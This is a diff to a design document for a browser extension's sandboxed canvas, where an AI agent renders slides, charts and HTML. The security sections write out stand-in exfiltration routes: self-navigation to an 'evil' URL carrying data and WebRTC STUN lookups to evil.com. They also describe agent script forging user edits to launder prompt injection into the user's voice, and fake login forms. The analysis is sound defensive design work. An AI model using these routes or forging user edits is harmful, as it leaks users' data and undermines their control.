@@ -68,8 +68,12 @@ versioned surface next to the conversation that the agent renders into and updat
 - **eval scan (static grep of the dist files):** reveal.js has 0 `eval` and 0 `Function(`. Chart.js
   has none (only identifiers named `…Function(`). `mermaid.tiny.js` has 0 `eval` and 4
   `Function("return this")()` global-object fallbacks that sit behind `self` checks. pptxgenjs has
-  core-js polyfill fallbacks. **Runtime behaviour has not been verified.** It does not change the
-  decision, because all of these run inside the sandbox (§3.2).
+  core-js polyfill fallbacks. The grep is not a safety control: the sandbox CSP has no
+  `'unsafe-eval'`, so any eval is blocked regardless. The real risk is **functional**: a library
+  whose fallback throws, or mermaid 12's default ELK layout trying to start a Worker (blocked by
+  `worker-src 'none'`). So each engine gets a **smoke test that renders a fixture inside the real
+  sandbox CSP and passes only with zero `securitypolicyviolation` events**. For mermaid, check
+  whether `@mermaid-js/tiny` bundles ELK and whether it runs without a Worker.
 
 ---
 
@@ -85,52 +89,107 @@ A canvas opens in **its own extension tab** (`canvas.html`), not inside the pane
   existing canvas tab or creates one. One tab shows one canvas, with a version picker.
 - The panel never renders canvas content itself.
 
-### 3.2 Isolation — host page plus a sandboxed frame
+### 3.2 Isolation — host page plus sandboxed frames
 
 ```
 canvas.html  (extension page — trusted chrome: title, versions, banner, export; NEVER agent HTML)
-  └─ <iframe src="canvas-frame.html">  (manifest sandbox page — opaque origin, no chrome.*)
-        renders the content: markdown / reveal / chart / mermaid / html
+  ├─ <iframe src="canvas-frame.html#<nonce>">       (sandbox page: our engines + editors, no agent script)
+  │     renders markdown / slides / image / chart / mermaid; hosts the phase 2 editors
+  └─ <iframe src="canvas-html-frame.html#<nonce>">  (sandbox page, phase 2: agent HTML + inline script)
+        renders one `html` canvas; view-only, never sees edits or other canvases
 ```
 
-- **Host → frame:** `postMessage({type:"render", kind, content, version})`. The frame never fetches
-  anything; everything it shows arrives in this message.
-- **Frame → host:** a fixed, small schema only: `ready`, `rendered{version}`, `error{msg}`,
-  `selection{text}` (phase 2), `save{content, baseVersion}` (phase 2 editing). The host checks
-  `event.source === frame.contentWindow`, validates the type and fields, caps sizes, and ignores
-  everything else. The host only ever treats frame output as data.
-- **Sandbox CSP** (`content_security_policy.sandbox`):
+Both are `manifest.sandbox.pages`: opaque origin, no `chrome.*` `[MV3-Sandbox]`.
+
+**What the sandbox does and does not stop.** `connect-src 'none'`, `img-src data: blob:`,
+`form-action 'none'`, no `allow-popups` and no `allow-top-navigation` close fetch, image beacons,
+form posts, `window.open` and navigating the top page. CSS `url()` falls under `img-src`/`font-src`
+and `@import` under `style-src 'self'`, so they are closed too. `blob:` cannot be navigated to, and
+downloads need `allow-downloads`. **They do not stop the frame from navigating itself**
+(`location = "https://evil/?d=…"`): removing `allow-top-navigation` only protects the top page, and
+the CSP `navigate-to` directive never shipped. A clicked link in rendered markdown does the same.
+After such a navigation the attacker page is the same WindowProxy, so `event.source` still matches,
+and a sandboxed origin is `"null"` either way, so `event.origin` cannot tell them apart. Everything
+below is built around that.
+
+- **Load gate.** The host listens for the iframe's `load` event and counts the loads it caused
+  itself (the initial `src`, and the print reload in §3.8). **Any other load means the frame
+  navigated away:** the host removes the iframe, shows a warning, and sends nothing more. Without
+  this, the next `render` (posted with `'*'`, the only option for an opaque origin) would go to the
+  attacker page.
+- **No navigation by links.** The frame calls `preventDefault` on every `a[href]` click and sends
+  `openLink{url}` instead. The host accepts only `http:`/`https:`, shows the full URL, and opens it
+  in a new tab after the user confirms. `target` attributes are stripped by DOMPurify.
+- **Nonce.** The host generates a random nonce per iframe and puts it in the `src` fragment. The
+  frame reads it once and includes it in every message; the host drops messages without it. This
+  holds in `canvas-frame.html`, which runs no agent script. In `canvas-html-frame.html` agent script
+  can read the hash, so there it is only a second check behind the load gate.
+- **Host → frame:** `postMessage({type:"render", nonce, kind, content, version})`. The frame never
+  fetches anything; everything it shows arrives in this message.
+- **Frame → host — per-frame allow-lists.** The host checks `event.source` against that frame's
+  `contentWindow`, the nonce, the type and fields, caps sizes, and treats the payload only as data.
+  - `canvas-frame.html`: `ready`, `rendered{version}`, `error{msg}`, `openLink{url}`, and in
+    phase 2 `selection{text}` and `save{content, baseVersion}`.
+  - `canvas-html-frame.html`: `ready`, `rendered{version}`, `error{msg}` only. **`save` and
+    `selection` are refused**, so agent script cannot forge a "user" edit. Otherwise a forged
+    `save` would be stored as `author:"user"` and read back by the agent as user intent: prompt
+    injection laundered into the user's voice.
+- **Titles** come from the agent. The host renders them with `textContent` only, capped at 120
+  characters.
+- **CSP, in two layers.** `content_security_policy.sandbox` is **one policy for every sandbox
+  page**, so it is the loosest any frame needs:
   ```
-  sandbox allow-scripts; default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
-  img-src data: blob:; font-src 'self' data:; connect-src 'none'; frame-src 'none';
-  form-action 'none'; base-uri 'none'
+  sandbox allow-scripts allow-modals; default-src 'none'; script-src 'self' 'unsafe-inline';
+  style-src 'self' 'unsafe-inline'; img-src data: blob:; font-src 'self' data:;
+  connect-src 'none'; frame-src 'none'; worker-src 'none'; form-action 'none'; base-uri 'none'
   ```
-  The `sandbox` token list is just `allow-scripts`: no `allow-same-origin`, `allow-popups`,
-  `allow-forms`, `allow-top-navigation` or `allow-modals`. With `connect-src 'none'`, `img-src`
-  limited to `data:`/`blob:`, no forms, no popups and no navigation, content in the frame has **no
-  way out except `postMessage` to the host**, and the host accepts only the schema above.
-- **Residual risk: phishing UI.** Agent HTML can draw a fake login form. Typed text cannot leave
-  (no network, no form action), but the user could be misled. The host therefore shows a permanent
-  banner: *"Agent-generated content — Katashiro never asks for passwords or keys here."*
-- Chrome documents that a custom sandbox CSP may restrict further, but must keep the `sandbox`
-  directive with `allow-scripts`. The default is `sandbox allow-scripts allow-forms allow-popups
-  allow-modals; script-src 'self' 'unsafe-inline' 'unsafe-eval'; child-src 'self'` `[MV3-Sandbox]`, so
-  ours is a strict tightening. To verify during implementation: Chrome loads the extension with it.
+  (`'unsafe-inline'` in `script-src` only from phase 2, when `canvas-html-frame.html` exists.)
+  Each page then tightens itself; a second policy can only add restrictions:
+  - `canvas-frame.html` carries `<meta http-equiv="Content-Security-Policy" content="script-src
+    'self'">`, so a DOMPurify bypass in markdown still cannot run script.
+  - The host sets the iframe `sandbox` attribute per frame (flags from the attribute and the CSP
+    both apply): `allow-scripts allow-modals` for `canvas-frame.html` (modals are needed to print,
+    §3.8, and no agent script runs there), and plain `allow-scripts` for `canvas-html-frame.html`.
+  Chrome documents that a custom sandbox CSP must keep `sandbox` with `allow-scripts`. Its default
+  is `sandbox allow-scripts allow-forms allow-popups allow-modals; script-src 'self' 'unsafe-inline'
+  'unsafe-eval'; child-src 'self'` `[MV3-Sandbox]`, so ours is a strict tightening. To verify during
+  implementation: Chrome loads the extension with it, and the meta CSP is enforced in the frame.
+- **CSP violations are reported.** Each frame listens for `securitypolicyviolation` and sends it as
+  `error{}`, so a library that hits a blocked eval or Worker fails visibly, not silently.
+
+**Residual risk.**
+- `canvas-frame.html` (all of phase 1): no agent script runs, links go through `openLink`, and the
+  load gate catches anything else. **Content has no way out except the allow-listed messages.**
+- `canvas-html-frame.html` (`html` kind, phase 2): **content can leave, and the ADR says so.** Agent
+  script can navigate the frame with data in the URL (the load gate notices only afterwards), and
+  can exfiltrate through WebRTC (`RTCPeerConnection` with a `stun:<data>.evil.com` ICE server
+  reaches DNS/UDP; Chrome does not implement the CSP `webrtc` directive, and `connect-src` does not
+  cover it). `<link rel=dns-prefetch>` has historically bypassed CSP; test it during
+  implementation. What limits the damage: the frame only ever receives its own canvas content,
+  never edits, other canvases or anything from the panel. A fake login form there **can** send what
+  the user types. The host therefore shows a permanent banner on every canvas, *"Agent-generated
+  content — Katashiro never asks for passwords or keys here"*, and the `html` kind sits behind a
+  setting that is off by default (§6 Q2).
 
 ### 3.3 Content kinds, in phases
 
 | Phase | `kind` | Engine (vendored, exact pin) | Notes |
 |---|---|---|---|
 | 1 | `markdown` | existing markdown-it + DOMPurify + hljs | same sink as the chat, full width |
-| 1 | `slides` | reveal.js 6.0.2 + markdown plugin | `---` between slides (`data-separator`); PDF via print |
+| 1 | `slides` | reveal.js 6.0.2, fed by markdown-it + DOMPurify | `---` between slides; PDF via print |
 | 1 | `image` | existing `show_image` decode path | `imageId` (screenshot) or `data` |
 | 2 | `chart` | Chart.js 4.5.1 | JSON config only; no JS callbacks |
-| 2 | `html` | none (agent HTML + inline JS) | needs `script-src 'unsafe-inline'` in the sandbox only |
+| 2 | `html` | none (agent HTML + inline JS) | own frame (§3.2); setting, off by default |
 | 3 | `mermaid` | `@mermaid-js/tiny` 12.1.0 | also renders ```` ```mermaid ```` fences in `markdown` |
 
 - Phase 1 runs **no agent-authored script**. Every engine is our own vendored code.
-- Phase 2's `html` kind is the first to run agent script. It adds `'unsafe-inline'` to the sandbox
-  `script-src` and nothing else: still no network and no eval.
+- **Slides are sanitized like markdown.** reveal's markdown plugin parses with marked, which passes
+  raw HTML through, and its `<!-- .element: … -->` comments set attributes. We do not use it.
+  Instead we split on `---`, render each slide with markdown-it + DOMPurify (the chat's sink), and
+  hand reveal finished `<section>` elements. Per-slide attributes, if ever needed, come from a small
+  allow-list we parse ourselves.
+- Phase 2's `html` kind is the first to run agent script, only in `canvas-html-frame.html` (§3.2).
+  Still no fetch and no eval, but not leak-proof (§3.2 residual risk).
 - **Mermaid supersedes the markdown ADR's dagre lean** `[MD-ADR §3.6]`. That lean existed because
   mermaid could not run on an extension page, and in the sandbox it can. Chat bubbles keep showing
   mermaid fences as code; the canvas renders them.
@@ -141,7 +200,7 @@ canvas.html  (extension page — trusted chrome: title, versions, banner, export
 
 | Tool | Does |
 |---|---|
-| `katashiro.canvas_open({title, kind, content \| imageId \| data, id?, baseVersion?})` | Without `id`: creates a canvas and returns `{id, version: 1}`. With `id`: a new version, re-rendered live. |
+| `katashiro.canvas_open({title, kind, content \| imageId \| data, id?, baseVersion?})` | Without `id`: creates a canvas and returns `{id, version: 1}`. With `id`: a new version, re-rendered live; **`baseVersion` is then required** (no blind writes). |
 | `katashiro.canvas_read({id, version?})` | Returns content plus version history (author, time), including **user edits** |
 | `katashiro.canvas_list()` | Lists the conversation's canvases: id, title, kind, latest version, last author |
 | `katashiro.canvas_patch({id, baseVersion, edits:[{find, replace}]})` | Phase 2: patches a long document without resending it |
@@ -154,25 +213,46 @@ canvas.html  (extension page — trusted chrome: title, versions, banner, export
 ### 3.5 Versions and concurrency (editing is phase 2)
 
 - Each save is a version `{n, author: "agent" | "user", at, content}`.
-- **Optimistic concurrency.** An agent update carries `baseVersion`. If the canvas has moved on
-  (the user edited it), the call is **rejected** and returns the current version, so the agent
-  reads and re-applies. A user's edit is never silently overwritten.
-- While an agent write is rendering, the editor is briefly read-only.
+- **Optimistic concurrency, agent side.** An agent update carries `baseVersion` (required with
+  `id`). If the canvas has moved on (the user edited it), the call is **rejected** with a
+  structured error, not the whole document: `{error: "stale", current, author, diffFromBase}`
+  (`diffFromBase` is a unified diff from `baseVersion` to `current`). The agent can rebase on the
+  diff without re-reading up to 2 MB. A user's edit is never silently overwritten.
+- **`canvas_patch` rebases itself.** Each `find` is matched against the **latest** version, not
+  `baseVersion`. If every `find` still matches exactly once, the patch applies on top of the
+  user's edit. Only a `find` that is missing or ambiguous rejects the call (with the error above).
+  The common case, "the user edited section A, the agent patches section B", does not conflict.
+- **User side: unsaved edits are never eaten.** If the user has unsaved changes when an agent
+  version arrives, the frame does not re-render. The host stores the agent's version and shows
+  *"Agent saved vN — view / keep editing"*. When the user then saves, their `save{baseVersion}` is
+  stale, and the host opens a conflict view (their text beside the latest version) where they
+  choose: keep mine as a new version on top, or discard mine. If the editor is clean, the new
+  version renders directly.
 - User edits reach the agent through `canvas_read`. Open question 4: should the next prompt also get
-  a one-line note such as `[canvas "X" edited by user: v5 → v6]`?
+  a one-line note such as `[canvas "X" edited by user: v5 → v6]`? If so, metadata only, never the
+  content.
 - Editors (phase 2): Milkdown crepe for `markdown`, and CodeMirror 6 source + live preview for
-  `slides`. **Both run inside the sandbox frame.** The host receives only the saved markdown string
-  via `save{}`. Phase 1 is view-only.
+  `slides`. **Both run inside `canvas-frame.html`, never in the `html` frame.** The host receives
+  only the saved markdown string via `save{}`. Phase 1 is view-only.
 
 ### 3.6 Storage and ownership
 
-- `chrome.storage.local`, with one key per canvas, `canvas:<id>` holding `{meta, versions[]}`, plus
-  an index. Caps: 50 canvases and 20 versions each (oldest dropped, the first version kept).
-  Consider the `unlimitedStorage` permission.
-- **A canvas belongs to a conversation** (`conversationId`, already minted by #61). When
-  multi-conversation lands, switching conversation switches the canvas list. Until then, the
-  window's conversation owns it.
-- Incognito panels use `storage.session`, mirroring the chat history (#54).
+- `chrome.storage.local` with the `unlimitedStorage` permission. **One key per version**, so a save
+  writes only the new version, not the whole history:
+  - `canvas:<conversationId>:index` — the conversation's canvases with title, kind, latest version
+    and byte size.
+  - `canvas:<id>:meta` — title, kind, `conversationId`, version list (`n`, author, time, bytes).
+  - `canvas:<id>:v<n>` — one version's content.
+- **The cap is a byte budget, not a count.** "50 canvases × 20 versions × 2 MB" would allow 2 GB.
+  The budget is 200 MB total (a setting). Over budget, the host drops the oldest versions first
+  (each canvas keeps its first and latest), then whole canvases, least recently opened first.
+- **Keyed by `conversationId` from day one** (already minted by #61), so multi-conversation needs no
+  migration. Until it lands, the window's conversation owns its canvases.
+- **Incognito** uses `storage.session`, mirroring the chat history (#54). That is about 10 MB, so the
+  same eviction applies against a 10 MB budget. If the new version alone does not fit, the tool
+  call fails with `{error: "quota"}` and the card says so; nothing is half-written.
+- If `chrome.storage.local` becomes slow at this size, move version bodies to IndexedDB on the
+  extension origin (the host page owns the reads and writes either way).
 
 ### 3.7 Chat integration
 
@@ -182,7 +262,13 @@ canvas.html  (extension page — trusted chrome: title, versions, banner, export
 
 ### 3.8 Export and import
 
-- **PDF** (phase 1): reveal's `?print-pdf` for slides, and the browser print dialog for markdown.
+- **PDF** (phase 1), through the browser print dialog. A sandboxed frame without `allow-modals`
+  cannot call `print()` (the HTML spec's sandboxed modals flag blocks it), which is why
+  `canvas-frame.html` gets `allow-modals` (§3.2). Export sends `print` to the frame; for slides the
+  host first reloads the frame with reveal's `?print-pdf` (a host-caused load, so the load gate
+  allows it), then the frame calls `print()`. `alert`/`confirm` are opened too, but nothing in that
+  frame is agent script. The `html` frame has no print. To verify during implementation: the
+  dialog prints the full deck. Fallback: print from `canvas.html` with the iframe sized to content.
 - **pptx export** (phase 2–3): `pptxgenjs` from **our slide model** (titles, bullets, images,
   code as monospace). The result is editable in PowerPoint but **not pixel-faithful**: reveal CSS
   and themes, fragments and transitions are lost. `dom-to-pptx` is the higher-fidelity candidate,
@@ -204,6 +290,9 @@ canvas.html  (extension page — trusted chrome: title, versions, banner, export
 - Vendor weight: reveal.js ~120 KB + CSS/themes, Chart.js ~200 KB, mermaid-tiny 2.7 MB (phase 3).
   The release zip grows by roughly 3 MB at full scope.
 - A second rendering path (sandbox) beside the panel's markdown sink, with its own security review.
+- The sandbox does not stop a frame from navigating itself. That takes a load gate, link
+  interception and per-frame message allow-lists (§3.2), and the `html` kind still cannot be made
+  leak-proof.
 - Version storage can grow quickly for big slide decks. Caps are needed, and old versions are lost.
 - pptx in either direction is lossy and must be described honestly in the UI.
 
@@ -237,12 +326,21 @@ canvas.html  (extension page — trusted chrome: title, versions, banner, export
 
 ## 6. Open questions (for Brett)
 
+Each has a recommendation from the review (Jellyfish, 2026-10-10), which this draft follows.
+
 1. **Surface:** a canvas tab (proposed), or a resizable drawer inside the panel?
+   *Recommended: the tab; a drawer is too narrow.*
 2. **`html` kind:** do we want agent-authored script at all (phase 2), or stop at
    markdown/slides/chart/mermaid?
-3. **Caps:** are 50 canvases × 20 versions enough?
+   *Recommended: phase 2 stops at `chart` (and `mermaid` in phase 3). If `html` is built later, it
+   ships only with §3.2 in full (own frame, refused `save`/`selection`, load gate, the stated
+   WebRTC/navigation leak), behind a setting that is off by default.*
+3. **Caps:** is a 200 MB byte budget right (§3.6)?
 4. **Edit visibility:** auto-note user edits in the next prompt, or only via `canvas_read`?
+   *Recommended: auto-note one metadata line (`v5→v6 by user`), never the content. This relies on
+   the `html` frame being unable to send `save` (§3.2); otherwise a forged save would be noted too.*
 5. **Order:** canvas phase 1 before multi-conversation (conversationId already exists), or after?
+   *Recommended: phase 1 first, with storage keyed by `conversationId` from day one (§3.6).*
 
 ---
 
